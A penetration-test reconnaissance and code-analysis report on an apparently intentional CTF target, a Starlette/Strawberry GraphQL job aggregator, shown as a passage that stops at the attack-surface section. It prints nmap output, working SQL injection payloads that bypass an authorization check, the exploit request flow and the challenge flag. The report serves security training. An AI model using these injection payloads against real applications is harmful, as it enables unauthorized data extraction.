# Pre-Reconnaissance Report

## Port Discovery (naabu)
Status: Skipped
[object Object]

## Network Scanning (nmap)
Status: success
Starting Nmap 7.97 ( https://nmap.org ) at 2025-10-30 20:45 -0700
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000027s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 995 closed tcp ports (conn-refused)
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Caddy httpd
|_http-title: Site doesn't have a title.
|_http-server-header: Caddy
443/tcp   open  ssl/https
|_http-title: Site doesn't have a title.
631/tcp   open  ipp       CUPS 2.3
|_http-title: Home - CUPS 2.3.4
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: CUPS/2.3 IPP/2.1
9999/tcp  open  abyss?
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, JavaRMI, Kerberos, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: GET, POST, OPTIONS
|     Access-Control-Allow-Headers: Content-Type
|     Content-Type: text/plain
|     Date: Fri, 31 Oct 2025 03:45:59 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: GET, POST, OPTIONS
|     Access-Control-Allow-Headers: Content-Type
|     Date: Fri, 31 Oct 2025 03:45:59 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: GET, POST, OPTIONS
|     Access-Control-Allow-Headers: Content-Type
|     Date: Fri, 31 Oct 2025 03:46:04 GMT
|_    Connection: close
49152/tcp open  http      Golang net/http server
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Server returned status 401 but no WWW-Authenticate header.
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 401 Unauthorized
|     Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'none'; script-src-elem 'none'; script-src-attr 'none'
|     Content-Type: text/plain; charset=utf-8
|     Tailscale-Cap: 115
|     Tailscale-Version: 1.82.5-tdec88625e-gec2eb9730
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: DENY
|     Date: Fri, 31 Oct 2025 03:45:59 GMT
|     Content-Length: 14
|     auth required
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9999-TCP:V=7.97%I=7%D=10/30%Time=690430F7%P=arm-apple-darwin24.4.0%
SF:r(GetRequest,E5,"HTTP/1\.1\x20200\x20OK\r\nAccess-Control-Allow-Origin:
SF:\x20\*\r\nAccess-Control-Allow-Methods:\x20GET,\x20POST,\x20OPTIONS\r\n
SF:Access-Control-Allow-Headers:\x20Content-Type\r\nContent-Type:\x20text/
SF:plain\r\nDate:\x20Fri,\x2031\x20Oct\x202025\x2003:45:59\x20GMT\r\nConne
SF:ction:\x20close\r\n\r\nOK")%r(HTTPOptions,C9,"HTTP/1\.1\x20200\x20OK\r\
SF:nAccess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Allow-Methods:\x2
SF:0GET,\x20POST,\x20OPTIONS\r\nAccess-Control-Allow-Headers:\x20Content-T
SF:ype\r\nDate:\x20Fri,\x2031\x20Oct\x202025\x2003:45:59\x20GMT\r\nConnect
SF:ion:\x20close\r\n\r\n")%r(FourOhFourRequest,E5,"HTTP/1\.1\x20200\x20OK\
SF:r\nAccess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Allow-Methods:\
SF:x20GET,\x20POST,\x20OPTIONS\r\nAccess-Control-Allow-Headers:\x20Content
SF:-Type\r\nContent-Type:\x20text/plain\r\nDate:\x20Fri,\x2031\x20Oct\x202
SF:025\x2003:45:59\x20GMT\r\nConnection:\x20close\r\n\r\nOK")%r(JavaRMI,2F
SF:,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%
SF:r(RTSPRequest,C9,"HTTP/1\.1\x20200\x20OK\r\nAccess-Control-Allow-Origin
SF::\x20\*\r\nAccess-Control-Allow-Methods:\x20GET,\x20POST,\x20OPTIONS\r\
SF:nAccess-Control-Allow-Headers:\x20Content-Type\r\nDate:\x20Fri,\x2031\x
SF:20Oct\x202025\x2003:46:04\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RP
SF:CCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r
SF:\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\
SF:r\nConnection:\x20close\r\n\r\n")%r(DNSStatusRequestTCP,2F,"HTTP/1\.1\x
SF:20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(Help,2F,"HT
SF:TP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(SS
SF:LSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20cl
SF:ose\r\n\r\n")%r(TerminalServerCookie,2F,"HTTP/1\.1\x20400\x20Bad\x20Req
SF:uest\r\nConnection:\x20close\r\n\r\n")%r(TLSSessionReq,2F,"HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(Kerberos,2F,
SF:"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r
SF:(SMBProgNeg,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20cl
SF:ose\r\n\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port49152-TCP:V=7.97%I=7%D=10/30%Time=690430F7%P=arm-apple-darwin24.4.0
SF:%r(FourOhFourRequest,192,"HTTP/1\.0\x20401\x20Unauthorized\r\nContent-S
SF:ecurity-Policy:\x20default-src\x20'none';\x20frame-ancestors\x20'none';
SF:\x20script-src\x20'none';\x20script-src-elem\x20'none';\x20script-src-a
SF:ttr\x20'none'\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nTails
SF:cale-Cap:\x20115\r\nTailscale-Version:\x201\.82\.5-tdec88625e-gec2eb973
SF:0\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20DENY\r\n
SF:Date:\x20Fri,\x2031\x20Oct\x202025\x2003:45:59\x20GMT\r\nContent-Length
SF::\x2014\r\n\r\nauth\x20required\n")%r(GenericLines,67,"HTTP/1\.1\x20400
SF:\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
SF:Connection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(GetRequest,192,"H
SF:TTP/1\.0\x20401\x20Unauthorized\r\nContent-Security-Policy:\x20default-
SF:src\x20'none';\x20frame-ancestors\x20'none';\x20script-src\x20'none';\x
SF:20script-src-elem\x20'none';\x20script-src-attr\x20'none'\r\nContent-Ty
SF:pe:\x20text/plain;\x20charset=utf-8\r\nTailscale-Cap:\x20115\r\nTailsca
SF:le-Version:\x201\.82\.5-tdec88625e-gec2eb9730\r\nX-Content-Type-Options
SF::\x20nosniff\r\nX-Frame-Options:\x20DENY\r\nDate:\x20Fri,\x2031\x20Oct\
SF:x202025\x2003:45:59\x20GMT\r\nContent-Length:\x2014\r\n\r\nauth\x20requ
SF:ired\n")%r(HTTPOptions,192,"HTTP/1\.0\x20401\x20Unauthorized\r\nContent
SF:-Security-Policy:\x20default-src\x20'none';\x20frame-ancestors\x20'none
SF:';\x20script-src\x20'none';\x20script-src-elem\x20'none';\x20script-src
SF:-attr\x20'none'\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nTai
SF:lscale-Cap:\x20115\r\nTailscale-Version:\x201\.82\.5-tdec88625e-gec2eb9
SF:730\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20DENY\r
SF:\nDate:\x20Fri,\x2031\x20Oct\x202025\x2003:45:59\x20GMT\r\nContent-Leng
SF:th:\x2014\r\n\r\nauth\x20required\n")%r(RTSPRequest,67,"HTTP/1\.1\x2040
SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(Help,67,"HTTP/1\
SF:.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=
SF:utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.54 seconds


## Subdomain Discovery (subfinder)
Status: success
[object Object]

## Technology Detection (whatweb)
Status: success
[1m[34mhttp://localhost:38609[0m [200 OK] [1mBootstrap[0m[[1m[32m4.5.2[0m], [1mHTML5[0m, [1mHTTPServer[0m[[1m[36muvicorn[0m], [1mIP[0m[[0m[22m::1[0m], [1mScript[0m, [1mTitle[0m[[1m[33mUltimate Job Aggregator[0m]

## Code Analysis
# Penetration Test Code Analysis Report
## XBEN-038-24: Ultimate Job Aggregator

---

# Penetration Test Scope & Boundaries

**Primary Directive:** This analysis is strictly limited to the **network-accessible attack surface** of the application. All findings adhere to this scope, focusing exclusively on components reachable through network requests.

### In-Scope: Network-Reachable Components
A component is considered **in-scope** if its execution can be initiated, directly or indirectly, by a network request that the deployed application server is capable of receiving. This includes:
- Publicly exposed web pages and API endpoints
- Endpoints requiring authentication via the application's standard login mechanisms (note: this application has NO authentication)
- Any developer utility, debug console, or script that has been mistakenly exposed through a route or is otherwise callable from other in-scope, network-reachable code

### Out-of-Scope: Locally Executable Only
A component is **out-of-scope** if it **cannot** be invoked through the running application's network interface and requires an execution context completely external to the application's request-response cycle. This includes:
- Command-line interface tools (`go run`, `python scripts/...`)
- Development environment tooling (IDE scripts)
- CI/CD pipeline scripts or build tools (Makefile, docker build processes)
- Database migration scripts, backup tools, or maintenance utilities
- Local development servers, test harnesses, or debugging utilities
- Static files or scripts requiring manual opening in a browser (not served by the application)

**Note:** This is a CTF challenge application where vulnerabilities are intentionally present for security training purposes.

---

## 1. Executive Summary

This is a **vulnerable-by-design CTF challenge application** implementing a Python-based GraphQL API for a job aggregator system. The application is built with **Starlette ASGI framework** and **Strawberry GraphQL**, backed by a **SQLite3 database** containing a hidden flag. The application demonstrates **critical security vulnerabilities** including SQL injection, broken access control, and cross-site scripting (XSS), all intentionally designed for penetration testing training.

The primary attack surface consists of **three network-accessible HTTP endpoints** with the GraphQL API endpoint serving as the main vulnerability vector. The application implements **zero authentication mechanisms** and relies on a trivially bypassable client-side check to protect sensitive "private" job listings that contain the CTF flag. The SQL injection vulnerability in the GraphQL query resolver allows attackers to bypass this protection and extract the flag with a single crafted query.

From an external attacker's perspective, the application presents an ideal target: no authentication barriers, minimal security controls, plaintext data storage, and multiple pathways to flag extraction. The technology stack is modern (Python 3.12, recent framework versions), but security controls are entirely absent, demonstrating the critical difference between using current technologies and implementing secure coding practices. The flag is stored in plaintext across multiple locations (database, filesystem, environment variables), creating redundant attack vectors for compromise.

---

## 2. Architecture & Technology Stack

### Framework & Language

The application is built on **Python 3.12** using a modern ASGI (Asynchronous Server Gateway Interface) stack. The core framework is **Starlette 0.37.2**, a lightweight ASGI framework that provides routing and HTTP handling capabilities. GraphQL functionality is implemented through **Strawberry GraphQL 0.235.0**, a code-first GraphQL library that uses Python type hints and decorators to define schemas. The application server is **Uvicorn 0.29.0**, a lightning-fast ASGI server that binds to all interfaces (0.0.0.0) on port 80, serving unencrypted HTTP traffic.

The technology choices represent modern Python web development practices, with versions released in 2024 indicating recent deployment. However, the framework selection has critical security implications: Starlette provides minimal security features out-of-the-box, requiring developers to explicitly add middleware for CORS, CSRF protection, security headers, and authentication. This application has **added zero security middleware**, leaving all default protections disabled. The Strawberry GraphQL implementation similarly lacks query complexity limiting, depth limiting, or field-level authorization—all critical defenses in production GraphQL APIs.

From a penetration testing perspective, the stack is straightforward to exploit. Python string formatting (f-strings) used for SQL query construction creates obvious injection points. The ASGI architecture, while performant, doesn't inherently provide security controls. The lack of any web application firewall (WAF), rate limiting, or input validation frameworks means attackers face no impediments to exploitation. The application's total codebase is minimal (approximately 200 lines), making vulnerability discovery rapid and comprehensive.

### Architectural Pattern

This is a **monolithic containerized web application** following a single-process, single-container deployment pattern. The architecture is intentionally simple: one Docker container runs one Python process (Uvicorn) that handles all HTTP requests, GraphQL query resolution, and database operations. There are **no microservices**, no service mesh, no external dependencies beyond the embedded SQLite database. The application is completely self-contained within its container boundary.

The architectural trust boundaries are trivial: everything runs in the same process with the same privileges. There is **no separation of concerns** between web layer, business logic, and data access layer—all three exist within a single 92-line Python file (`main.py`). This monolithic design eliminates horizontal attack surface (no inter-service communication to intercept) but concentrates all vulnerabilities in a single codebase. The database is an in-memory SQLite file recreated on every application startup, meaning no data persists between container restarts. This ephemeral nature is intentional for a CTF challenge—each instance starts clean with the flag freshly injected.

From a security architecture perspective, this design has critical weaknesses. There is **no defense in depth**—if the web layer is compromised (which it is, via SQL injection), the entire database is immediately accessible. No privilege separation exists: the web server process has full read/write access to the database file. The container runs as root by default (no USER directive in Dockerfile), violating least-privilege principles. Network isolation is minimal—the container exposes port 80 directly with no reverse proxy, no TLS termination, and no web application firewall in front.

The GraphQL API architecture exacerbates these issues. GraphQL's flexible query language allows clients to request exactly the data they need, but without proper authorization controls, this flexibility becomes a liability. Attackers can craft queries to extract sensitive fields, use introspection to map the entire schema, and potentially abuse query complexity to cause denial-of-service. This application lacks **all GraphQL-specific security controls**: introspection is enabled, no query depth limiting, no query cost analysis, no field-level authorization beyond the bypassable string check.

### Critical Security Components

The application's security posture can be summarized as **comprehensively insecure by design**. Every layer that should provide security controls is either absent or trivially bypassable.

**Database Layer Security:** The SQLite3 database (`test.db`) is created in-memory with zero encryption, zero authentication, and zero access controls. The database connection function (`get_db_connection()` at lines 12-15 in `main.py`) uses a bare `sqlite3.connect()` call with no password, no encryption key, no connection timeout, and no connection pooling. The `row_factory` configuration allows dictionary-like access to results, which is convenient for developers but provides no security benefit. The database schema (lines 23-28) defines a simple `jobs` table with no constraints, no field length limits, no foreign keys, and no indexes. The flag is stored in the `description` field of the row where `type='private'`—a design that relies on application-level filtering rather than database-level access control.

**Query Construction Security:** The critical vulnerability exists at **line 60 of main.py**, where user-controlled input from the GraphQL `jobType` parameter is directly interpolated into a SQL query using an f-string: `query = f"SELECT * FROM jobs WHERE type = '{job_type}'"`. This is textbook SQL injection—no parameterized queries, no input sanitization, no escaping. SQLite supports parameterized queries via the `?` placeholder syntax (`cursor.execute("SELECT * FROM jobs WHERE type = ?", (job_type,))`), but the developer chose string formatting instead. This single line of code undermines the entire security model of the application.

**Access Control Mechanism:** Lines 55-57 implement the "security" check that attempts to prevent access to private jobs:
```python
if job_type and job_type == 'private':
    conn.close()
    raise Exception("Only admins can see private jobs")
```
This check has **multiple critical flaws**. First, it's a simple string comparison with no actual authentication—there's no verification of user identity, no session token validation, no role checking. Second, the check happens **before** the SQL query is constructed but doesn't prevent SQL injection. An attacker can bypass this by providing `job_type = "private' OR '1'='1"`, which doesn't match the literal string `'private'` but still extracts private jobs through SQL injection. Third, the error message reveals business logic to attackers, confirming that "private" jobs exist and are restricted.

**Container Security:** The Dockerfile (lines 1-13 of `app/Dockerfile`) demonstrates multiple security weaknesses. The container runs as root (no `USER` directive), violating the principle of least privilege. The flag is injected at build time using `ARG FLAG` and a `sed` command (line 11: `RUN sed -i s/FLAG/$FLAG/g flag.txt`), which embeds the flag in the container image layers where it's visible via `docker history`. Build arguments are not meant for secrets—they're logged in build output and stored in image metadata. The proper approach would use Docker secrets or mount secrets at runtime, but this application intentionally violates best practices for CTF purposes.

**Network Security:** The application binds to `0.0.0.0:80` (all network interfaces, HTTP port 80) with **no TLS/SSL encryption**. All traffic—including GraphQL queries and responses containing the flag—traverses the network in plaintext. There's no HTTPS redirect, no HSTS headers, no certificate configuration. Docker Compose exposes port 80 without host port restriction, making it accessible from any network interface on the host. A production application would use a reverse proxy (nginx, Traefik) with TLS termination, but this application has no such protection.

---

## 3. Authentication & Authorization Deep Dive

### Authentication Mechanisms

**CRITICAL FINDING:** This application implements **ZERO authentication mechanisms**. There is no login functionality, no user registration, no session management, no token-based authentication, and no API key validation. Every endpoint is publicly accessible to any client that can send HTTP requests to the server.

The complete absence of authentication is visible throughout the codebase. Examination of all imports in `main.py` reveals no authentication libraries: no `passlib`, no `python-jose` (JWT), no `authlib`, no `fastapi-users`, no session middleware. The Starlette application initialization (line 87: `app = Starlette(routes=routes)`) includes **zero middleware**—no `SessionMiddleware`, no `AuthenticationMiddleware`, no custom authentication decorators.

The route definitions (lines 80-84) show three endpoints, none of which have any authentication requirements:
- `Route("/", endpoint=read_root)` - Serves static HTML with no auth check
- `Mount("/graphql", GraphQL(strawberry.Schema(query=Query)))` - GraphQL API with no auth check
- `Route("/ping", endpoint=ping)` - Health check with no auth check

The GraphQL resolver (`jobs()` method at lines 48-68) accepts requests from any client. The `_info` parameter provided by Strawberry GraphQL could theoretically contain authentication context, but the method never examines it. No decorators like `@strawberry.field(permission_classes=[...])` are present—field-level authorization is completely absent.

From a penetration testing perspective, this is the most significant finding: **no authentication barrier exists between external attackers and sensitive data**. There's no need to brute-force credentials, bypass login forms, steal session tokens, or exploit authentication vulnerabilities—the application simply grants full access to all functionality immediately.

### Authentication Endpoints

**EXHAUSTIVE LIST OF AUTHENTICATION-RELATED ENDPOINTS:** **NONE EXIST**

Comprehensive analysis of all routes confirms the complete absence of authentication endpoints:
- ❌ No `/login` endpoint
- ❌ No `/logout` endpoint
- ❌ No `/register` or `/signup` endpoint
- ❌ No `/forgot-password` or `/reset-password` endpoints
- ❌ No `/token`, `/refresh`, or `/oauth/token` endpoints
- ❌ No `/verify`, `/activate`, or `/confirm` endpoints
- ❌ No `/api/auth/*` routes
- ❌ No SSO/SAML/OIDC callback endpoints

The entire routing table consists of exactly three routes (lines 80-84 in `main.py`):
1. `GET /` → Serves `static/index.html`
2. `POST/GET /graphql` → GraphQL API endpoint
3. `GET /ping` → Returns "pong" (health check)

This minimalist design eliminates entire categories of authentication vulnerabilities (credential stuffing, session fixation, password reset poisoning, OAuth callback manipulation) simply because the attack surface doesn't exist. However, it also means **any attacker with network access has full API access**.

### Session Management

**FINDING:** Session management is **completely absent**. The application maintains **zero state** between requests, stores **no session cookies**, and implements **no session tracking**.

Analysis of HTTP response headers (generated by `HTMLResponse` objects at lines 72-77) reveals no `Set-Cookie` headers. The Starlette application has no `SessionMiddleware` configured, which would be required to enable session functionality. No session storage backends (Redis, Memcached, database session tables) exist in the architecture.

**Critical Session Cookie Security Flags:** Since no session cookies are set, the analysis of cookie security flags is **NOT APPLICABLE**. However, for documentation purposes, if session cookies were implemented, the following security flags would need configuration:

- **HttpOnly Flag:** **NOT CONFIGURED** (no cookies exist)
  - **File Location:** N/A
  - **Security Impact:** If sessions existed without HttpOnly, JavaScript could access session tokens, enabling session theft via XSS
  
- **Secure Flag:** **NOT CONFIGURED** (no cookies exist)
  - **File Location:** N/A
  - **Security Impact:** If sessions existed without Secure flag, session cookies would transmit over unencrypted HTTP, enabling man-in-the-middle interception
  
- **SameSite Flag:** **NOT CONFIGURED** (no cookies exist)
  - **File Location:** N/A
  - **Security Impact:** If sessions existed without SameSite, the application would be vulnerable to cross-site request forgery (CSRF) attacks

The absence of session management means the application is **stateless**—each request is processed independently without reference to previous requests. This architectural choice eliminates session-based vulnerabilities but also prevents any authentication model that relies on server-side session state (traditional session-based auth, remember-me tokens, session timeout enforcement).

### Authorization Model

The application implements a **broken authorization model** that relies on client-side filtering and a bypassable server-side check. The authorization logic exists exclusively in the `jobs()` GraphQL resolver at **lines 55-57 of main.py**:

```python
if job_type and job_type == 'private':
    conn.close()
    raise Exception("Only admins can see private jobs")
```

**Authorization Bypass Analysis:** This check is fundamentally flawed and trivially bypassable through multiple attack vectors:

**Bypass Vector 1: SQL Injection (Primary)**
The authorization check validates that `job_type` is not the literal string `'private'`, but the subsequent SQL query construction (line 60) uses f-string interpolation without sanitization. An attacker can bypass the check by providing a `job_type` value that:
1. Does NOT equal the string `'private'` (passes the authorization check)
2. BUT still retrieves private jobs through SQL injection

Example exploit:
```graphql
query {
  jobs(jobType: "private' OR '1'='1") {
    id name type description
  }
}
```

This payload passes the authorization check (doesn't match literal `'private'`) but generates the SQL:
```sql
SELECT * FROM jobs WHERE type = 'private' OR '1'='1'
```
Which returns all jobs including those with `type='private'` containing the flag.

**Bypass Vector 2: Boolean-Based SQL Injection**
More sophisticated attackers could extract private jobs exclusively:
```graphql
query {
  jobs(jobType: "' OR type='private' --") {
    description
  }
}
```
Resulting SQL:
```sql
SELECT * FROM jobs WHERE type = '' OR type='private' --'
```
This returns only private jobs, directly extracting the flag.

**Authorization Design Flaws:**

1. **No Identity Verification:** The check validates the parameter value, not the requester's identity. There's no concept of "admin users" in the application—no user database, no role assignments, no permission grants.

2. **Trust Boundary Violation:** Authorization decisions should be made based on the authenticated user's privileges, not based on user-supplied input parameters. This design trusts the client to not request private jobs, which is security through obscurity.

3. **Fail-Open on Bypass:** When the authorization check is bypassed (via SQL injection), the application returns all requested data without further verification. There's no defense in depth—a single bypass defeats all security.

4. **Information Disclosure:** The error message "Only admins can see private jobs" reveals that: (a) private jobs exist, (b) they're restricted to admins, (c) the parameter value `'private'` triggers restriction. This guides attackers toward the correct exploitation path.

### Multi-Tenancy Security

**NOT APPLICABLE:** This is a **single-tenant application** with no organizational separation, no tenant isolation, and no multi-user architecture. All data exists in a single database table with no tenant ID filtering. If multiple organizations used this application, they would all share the same jobs table with no row-level security separating their data.

### SSO/OAuth/OIDC Flows

**FINDING:** No Single Sign-On, OAuth 2.0, or OpenID Connect implementations exist in this application.

**SSO/OAuth/OIDC Callback Endpoints:** **NONE**

Search results for OAuth-related patterns reveal zero implementations:
- ❌ No `/oauth/callback` or `/auth/callback` endpoints
- ❌ No authorization code exchange logic
- ❌ No access token requests to identity providers
- ❌ No JWT validation or JWKS fetching
- ❌ No `state` parameter generation or validation
- ❌ No `nonce` parameter generation or validation
- ❌ No OAuth client credentials (client_id, client_secret)
- ❌ No identity provider configuration (Okta, Auth0, Google, etc.)

**File Location for OAuth State/Nonce Validation:** **N/A** - No OAuth implementation exists, therefore no state/nonce validation code exists.

**Security Implication:** While the absence of OAuth eliminates OAuth-specific vulnerabilities (authorization code interception, CSRF via missing state validation, token leakage), it also means **no federated authentication** is available. Users cannot authenticate using corporate credentials, Google accounts, or other identity providers. For a CTF challenge, this is intentional—the attack path is SQL injection, not OAuth exploitation.

---

## 4. Data Security & Storage

### Database Security

The application uses **SQLite3**, an embedded file-based database engine, for all data persistence. The database security posture is comprehensively weak across all evaluation criteria.

**Database Connection Security:** The connection function (`get_db_connection()` at **lines 12-15 of main.py**) implements the bare minimum:
```python
def get_db_connection():
    conn = sqlite3.connect('test.db')
    conn.row_factory = sqlite3.Row
    return conn
```

This configuration has **zero security controls**:
- **No authentication:** SQLite file-based databases don't require passwords by default
- **No encryption:** The database file is stored in plaintext on disk
- **No connection timeout:** Connections remain open indefinitely
- **No connection pooling:** Each request creates a new connection, risking resource exhaustion
- **No connection limits:** Unlimited concurrent connections possible

**Encryption at Rest:** **COMPLETELY ABSENT**. The SQLite database file (`test.db`) is stored in plaintext on the container filesystem. All data—including the CTF flag—is readable by anyone with filesystem access using standard tools:
```bash
sqlite3 test.db "SELECT description FROM jobs WHERE type='private';"
```

SQLite does support encryption through extensions like SQLCipher, but this application uses stock SQLite with zero encryption. The flag stored in the `description` field of the `jobs` table is visible in plaintext if the database file is extracted from the container.

**Access Controls:** SQLite is a file-based database, so access control is determined by filesystem permissions. The database file is created in the application working directory (`/app/test.db` in the container) with default permissions (typically 644, world-readable). The container runs as root (no USER directive in Dockerfile), so the database file is owned by root. However, since the application itself runs as root, any code execution vulnerability would grant immediate filesystem access to read `test.db` directly.

**Query Safety:** The application has **one critical SQL injection vulnerability** and several safe queries:

**VULNERABLE QUERY** (**line 60 of main.py**):
```python
query = f"SELECT * FROM jobs WHERE type = '{job_type}'"
```
User input (`job_type` from GraphQL parameter) is directly interpolated into the SQL query using f-string formatting. **Zero sanitization**, **zero escaping**, **zero parameterization**. This is a textbook SQL injection vulnerability.

**SAFE QUERIES:**
- **Lines 23-28:** `CREATE TABLE` statement (static SQL, no user input)
- **Line 29:** `DELETE FROM jobs` (static SQL, no user input)
- **Lines 30-35:** `INSERT INTO jobs` (f-string, but flag variable is controlled, not user input)
- **Line 62:** `SELECT * FROM jobs WHERE type IN ('front-end', 'back-end')` (static SQL, no user input)

The proper secure implementation of line 60 would use parameterized queries:
```python
query = "SELECT * FROM jobs WHERE type = ?"
cursor.execute(query, (job_type,))
```

SQLite's parameterization automatically escapes special characters, preventing SQL injection.

### Data Flow Security

**Flag Data Flow (Build Time to Runtime Storage):**

The flag follows a complex path from environment variables to database storage:

1. **Environment File** (`/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-038-24/.env`, line 1):
   ```
   FLAG="flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9}"
   ```
   Stored in plaintext with 644 permissions (world-readable). If this file is committed to Git, the flag becomes permanently visible in repository history.

2. **Docker Compose Build Argument** (`docker-compose.yml`, lines 4-6):
   ```yaml
   build: 
     context: ./app
     args:
       - FLAG
   ```
   The FLAG environment variable is passed to Docker as a build argument. Build arguments are visible in `docker history` output and stored in image metadata—**this is a security anti-pattern for secrets**.

3. **Dockerfile Injection** (`app/Dockerfile`, lines 9-11):
   ```dockerfile
   ARG FLAG
   RUN sed -i s/FLAG/$FLAG/g flag.txt
   ```
   The `sed` command performs an in-place substitution, replacing the literal text "FLAG" in `flag.txt` with the actual flag value. This embeds the flag in the container image layer.

4. **Filesystem Storage** (`/app/flag.txt` in container):
   After the Docker build, `flag.txt` contains the plaintext flag. This file persists in the container image and is readable by any process within the container.

5. **Application Startup** (`main.py`, **lines 18-37**):
   ```python
   def startup():
       with open("flag.txt") as f:
           flag = f.read()
       
       conn = get_db_connection()
       conn.execute('''CREATE TABLE IF NOT EXISTS jobs (...)''')
       conn.execute('DELETE FROM jobs')
       conn.execute(
           'INSERT INTO jobs (name, type, description) VALUES '
           '("Senior Frontend Dev", "front-end", "reactjs"), '
           '("Staff Backend Python", "back-end", "django"), '
           f'("Hidden job", "private", "{flag}"), '  # FLAG HERE
           '("Frontend Dev", "front-end", "angular")')
       conn.commit()
   ```
   
   At line 19-20, the flag is read from `flag.txt` into a Python variable. At lines 30-35, the flag is inserted into the `jobs` table in the `description` field of the row with `type='private'`. The database is recreated on every startup (line 29: `DELETE FROM jobs`), ensuring a clean slate for each CTF attempt.

6. **Database Storage** (`test.db`, `jobs` table):
   The flag now resides in the SQLite database:
   ```sql
   INSERT INTO jobs VALUES (?, 'Hidden job', 'private', 'flag{3c8f1e0c-ed42-4e5f-a038-61d9c40b9fc9}')
   ```

**Flag Data Flow (Storage to Network Exposure):**

**Normal Request Flow (Authorization Blocks Access):**
```
Client sends: POST /graphql {"query": "{ jobs(jobType: \"private\") { description } }"}
→ Starlette routes to GraphQL endpoint
→ Strawberry resolves Query.jobs(job_type="private")
→ Line 55-57: Check detects job_type == 'private'
→ Exception raised: "Only admins can see private jobs"
→ GraphQL error response returned to client
→ Flag NOT disclosed
```

**SQL Injection Flow (Authorization Bypassed):**
```
Client sends: POST /graphql {"query": "{ jobs(jobType: \"private' OR '1'='1\") { description } }"}
→ Starlette routes to GraphQL endpoint
→ Strawberry resolves Query.jobs(job_type="private' OR '1'='1")
→ Line 55-57: Check passes (doesn't match literal "private")
→ Line 60: query = f"SELECT * FROM jobs WHERE type = 'private' OR '1'='1'"
→ Line 64: cursor.execute(query)
→ SQL injection executes, returns all rows including type='private'
→ Line 65: jobs = cursor.fetchall()
→ Line 68: Python list comprehension creates Job objects
→ Strawberry serializes to JSON
→ GraphQL response includes flag in description field
→ Flag DISCLOSED to attacker
```

**Sensitive Data Paths:** The flag traverses through multiple trust boundaries without encryption or access control:
- **Disk → Memory:** Flag read from unencrypted file (`flag.txt`) into Python variable
- **Memory → Database:** Flag inserted into unencrypted SQLite database
- **Database → Memory:** Flag retrieved via SQL query
- **Memory → Network:** Flag serialized to JSON and transmitted over unencrypted HTTP
- **Network → Client Browser:** Flag displayed in plaintext in GraphQL response

Every step in this path is vulnerable to interception:
- Filesystem access → Read `flag.txt` or `test.db` directly
- Memory access → Dump process memory to extract flag variable
- Network sniffing → Capture HTTP response containing flag
- SQL injection → Bypass authorization and extract from database (primary attack vector)

### Multi-Tenant Data Isolation

**NOT APPLICABLE:** This application has no multi-tenancy architecture. All data exists in a single database with no tenant separation. The `jobs` table has no `tenant_id` or `organization_id` field to separate data. If multiple organizations used this system, they would all see each other's data—there's no row-level security.

From a security architecture perspective, implementing multi-tenancy in this design would require:
1. Adding a `tenant_id` column to all tables
2. Modifying every SQL query to include `WHERE tenant_id = ?` filters
3. Implementing session management to track which tenant the user belongs to
4. Adding tenant validation to prevent horizontal privilege escalation

None of these controls exist, making this a **single-tenant application** where all users (if authentication existed) would share the same data pool.

---

## 5. Attack Surface Analysis

### External Entry Points

